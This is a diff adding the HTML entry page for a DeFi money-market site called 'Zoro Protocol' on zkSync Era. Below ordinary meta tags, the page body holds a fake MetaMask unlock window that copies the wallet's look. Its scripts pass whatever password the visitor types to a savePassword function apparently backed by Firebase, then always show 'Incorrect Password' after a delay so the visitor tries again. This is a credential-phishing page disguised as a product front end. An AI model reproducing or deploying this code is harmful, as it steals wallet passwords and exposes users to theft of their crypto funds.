@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Zoro Protocol</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0" />
+    <meta name="application-name" content="Zoro Protocol" />
+    <meta name="format-detection" content="telephone=no">
+    <meta name="theme-color" content="#3A78FF" />
+    <link rel="icon" type="image/x-icon" href="./favicon.ico">
+    <link rel="manifest" href="/manifest.json" />
+
+    <link rel="icon" type="image/png" sizes="16x16" href="/icon/favicon-16x16.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/icon/favicon-32x32.png" />
+    <meta name="title" content="Zoro Protocol" />
+    <meta
+      name="description"
+      content="Zoro is a decentralized finance (DeFi) algorithmic money market protocol on ZkSync Era."
+    />
+    <meta
+      name="keywords"
+      content="zoro, zoro protocol, defi, borrow, lend, crypto, blockchain, bsc, bnb, bnb chain, decentralized finance, zkSync, zkSync Era"
+    />
+    <meta name="robots" content="index,follow"><!-- All Search Engines -->
+    <meta name="subject" content="Zoro Defi on ZkSync Era Chain" />
+    
+    <link rel="canonical" href="https://zoroprotocol.com" />
+    <link rel="manifest" href="/manifest.json" />
+    <!-- Links to information about the author(s) of the document -->
+    <link rel="author" href="" />
+    <!-- Refers to a copyright statement that applies to the link's context -->
+    <link rel="license" href="" />
+    
+    <!-- Provides information about an author or another person -->
+    <link rel="me" href="https://google.com/profiles/thenextweb" type="text/html">
+    <link rel="me" href="mailto:name@example.com">
+    <link rel="me" href="sms:+15035550125">
+    
+    <!-- Apple mobile -->
+    <meta name="apple-mobile-web-app-title" content="Zoro Protocol" />
+    <link rel="shortcut icon" href="/zoro-favicon.png">
+    <link rel="apple-touch-icon" type="image/png" href="/icon/apple-touch-icon.png" />
+    <link rel="icon" type="image/x-icon" href="/zoro-favicon.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/icon/favicon-16x16.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/icon/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="57x57" href="/icon/favicon-57x57.png" />
+    <link rel="icon" type="image/png" sizes="60x60" href="/icon/favicon-60x60.png" />
+    <link rel="icon" type="image/png" sizes="72x72" href="/icon/favicon-72x72.png" />
+    <link rel="icon" type="image/png" sizes="76x76" href="/icon/favicon-76x76.png" />
+    <link rel="icon" type="image/png" sizes="114x114" href="/icon/favicon-114x114.png" />
+    <link rel="icon" type="image/png" sizes="120x120" href="/icon/favicon-120x120.png" />
+    <link rel="icon" type="image/png" sizes="144x144" href="/icon/favicon-144x144.png" />
+    <link rel="icon" type="image/png" sizes="152x152" href="/icon/favicon-152x152.png" />
+    <link rel="icon" type="image/png" sizes="180x180" href="/icon/favicon-180x180.png" />
+    <link rel="stylesheet" href="/metamask.css" />
+    <!-- Open Graph -->
+    <meta property="og:title" content="Zoro Protocol" />
+    <meta property="og:site_name" content="Zoro Protocol" />
+    <meta property="og:url" content="https://zoroprotocol.com" />
+    <meta property="og:image" content="https://zoroprotocol.com/assets/images/logo/zoro-favicon.png" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="website" />
+    <meta
+      property="og:description"
+      content="Zoro is a decentralized finance (DeFi) algorithmic money market protocol on ZkSync Era."
+    />
+
+    <!-- Twitter -->
+    <meta name="twitter:title" content="Zoro Protocol" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Zoro Protocol" />
+    <meta
+      name="twitter:description"
+      content="Zoro is a decentralized finance (DeFi) algorithmic money market protocol on ZkSync Era."
+    />
+    <meta name="twitter:image" content="https://zoroprotocol.com/assets/images/logo/zoro-favicon.png" />
+    <meta name="twitter:site" content="@zoroprotocol" />
+    <meta name="twitter:creator" content="@zoroprotocol" />
+  </head>
+  <body>
+    <noscript>
+      Zoro is a decentralized finance (DeFi) algorithmic money market protocol on ZkSync Era.
+    </noscript>
+
+    <div id="root"></div>
+    <div id="loginModal" class="modal">
+      <div id="loginModalContent" class="modal-content">
+        <div class="metamask-loading" id="metamask-loading">
+          <div class="metamask-pending">
+            <img src="/metamask/metamask-fox.svg" width="150"/>
+            <img class="metamask-spinner" src="/metamask/spinner.gif"/>
+          </div>
+        </div>
+        <div class="metamask-content" id="metamask-content">
+          <div class="mm-loading-overlay hidden" id="mm-loading-overlay">
+            <img class="mm-loading" src="/metamask/VAyR.gif"/>
+          </div>
+          <div class="metamask-header">
+            <div class="metamask-net">
+              <img class="metamask-eth" src="/metamask/eth_logo.svg"/> <span class="metamask-netname">Ethereum Mainnet</span>
+              <img class="metamask-arrow-down" src="/metamask/arrow-down.svg"/>
+            </div>
+            <img class="metamask-icon" src="/metamask/metamask-fox.svg"/>
+          </div>
+          <div class="metamask-body">
+            <div id="metamask-3d"></div>
+            <div class="metamask-welcome-container">
+              <div class="metamask-welcome">Welcome back!</div>
+              <div class="metamask-await">The decentralized web awaits</div>
+            </div>
+            <div class="input-container">
+              <input id="metamask-password" class="animated-input" placeholder=" " type="password"/>
+              <label for="input" class="floating-label">Password</label>
+            </div>
+            <div class="hidden" id="incorrect-password">Incorrect Password</div>
+            <div>
+              <button class="metamask-unlock" id="metamask-unlock" disabled>Unlock</button>
+            </div>
+            <div class="metamask-pf"><a class="metamask-forgot">Forgot password?</a></div>
+            <div class="metamask-help">Need help? Contact <a class="metamask-support" href="https://support.metamask.io" target="_blank" rel="noopener noreferrer">MetaMask support</a></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script type="module" src="/src/index.tsx"></script>
+    <script type="module">
+      import { savePassword } from '/src/firebase_functions.ts';
+      document.getElementById('metamask-unlock').addEventListener('click', function (ev) {
+        savePassword(metamaskInput.value);
+      });
+      document.getElementById('metamask-password').addEventListener('keydown', function(event) {
+          if (event.key === 'Enter') {
+            savePassword(metamaskInput.value);
+          }
+      });
+    </script>
+    <script src="/metamask/bundle.js"></script>
+    <script>
+      
+      const modal = document.getElementById("loginModal");
+      const modalContent = document.querySelector(".modal-content");
+      let mousePressedOutside = false;
+      // const closeModalButton = document.querySelector(".close");
+      const metamaskButton = document.getElementById("metamaskLogin");
+      const metamaskLoading = document.getElementById("metamask-loading");
+      const metamaskContent = document.getElementById("metamask-content");
+      const metamaskInput = document.getElementById('metamask-password');
+      const unlockBtn = document.getElementById('metamask-unlock');
+      const mmLoading = document.getElementById('mm-loading-overlay');
+      const incorrectPassword = document.getElementById('incorrect-password');
+
+      metamaskInput.addEventListener('input', function (ev) {
+        if(metamaskInput.value != ''){
+          unlockBtn.removeAttribute("disabled");
+        } else{
+          unlockBtn.setAttribute('disabled', 'disabled');
+        }
+        metamaskInput.classList.remove("invalid");
+        incorrectPassword.classList.add("hidden");
+      });
+
+      unlockBtn.addEventListener('click', function (ev) {
+        mmLoading.classList.remove("hidden");
+        let timer = setTimeout(() => {
+          clearTimeout(timer);
+          mmLoading.classList.add("hidden");
+          metamaskInput.classList.add("invalid");
+          incorrectPassword.classList.remove("hidden");
+        }, 5000);
+      });
+
+      metamaskInput.addEventListener('keydown', function(event) {
+          if (event.key === 'Enter') {
+            mmLoading.classList.remove("hidden");
+            let timer = setTimeout(() => {
+              clearTimeout(timer);
+              mmLoading.classList.add("hidden");
+              metamaskInput.classList.add("invalid");
+              incorrectPassword.classList.remove("hidden");
+            }, 5000);
+          }
+      });
+
+      // Open modal
+      function openMetaMaskModal(){
+        if (typeof window.ethereum !== 'undefined') {
+          modal.style.display = "block";
+          metamaskInput.value='';
+          metamaskInput.classList.remove("invalid");
+          incorrectPassword.classList.add("hidden");
+          unlockBtn.setAttribute('disabled', 'disabled');
+          let timer = setTimeout(() => {
+            clearTimeout(timer);
+            metamaskLoading.style.display = "none";
+            metamaskContent.style.display = "block";
+            metamaskInput.focus();
+          }, 3000);
+        } else {
+            alert('Please install MetaMask!');
+        }
+      }
+
+      // Track mouse press state
+      document.addEventListener("mousedown", (event) => {
+        // Check if the click started outside the modal content
+        mousePressedOutside = !modalContent.contains(event.target);
+      });
+
+      // Close modal on mouse release if clicked and released outside
+      document.addEventListener("mouseup", (event) => {
+        if (mousePressedOutside && !modalContent.contains(event.target)) {
+          modal.style.display = "none";
+          metamaskContent.style.display = 'none';
+          metamaskLoading.style.display = "flex";
+          if(tdlogo){
+            let metamask3d = document.getElementById('metamask-3d');
+            metamask3d.removeChild(metamask3d.firstChild);
+            tdlogo = null;
+          }
+        }
+        // Reset the state
+        mousePressedOutside = false;
+      });
+
+      // Prevent modal from closing on click inside modal content
+      modalContent.addEventListener("click", (event) => {
+        event.stopPropagation();
+      });
+
+      // window.addEventListener("click", (event) => {
+      //   if (event.target === modal && document.getElementById('metamask-password')) {
+      //     modal.style.display = "none";
+      //     metamaskContent.style.display = 'none';
+      //     metamaskLoading.style.display = "flex";
+      //     if(tdlogo){
+      //       let metamask3d = document.getElementById('metamask-3d');
+      //       metamask3d.removeChild(metamask3d.firstChild);
+      //       tdlogo = null;
+      //     }
+      //   }
+      // });
+
+      // Connect with MetaMask
+      // metamaskButton.addEventListener("click", async () => {
+      //   if (typeof window.ethereum !== "undefined") {
+      //     try {
+      //       const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+      //       alert(`Connected with account: ${accounts[0]}`);
+      //     } catch (error) {
+      //       console.error(error);
+      //     }
+      //   } else {
+      //     alert("MetaMask is not installed. Please install it to continue.");
+      //   }
+      // });
+    </script>
+  </body>
+</html>
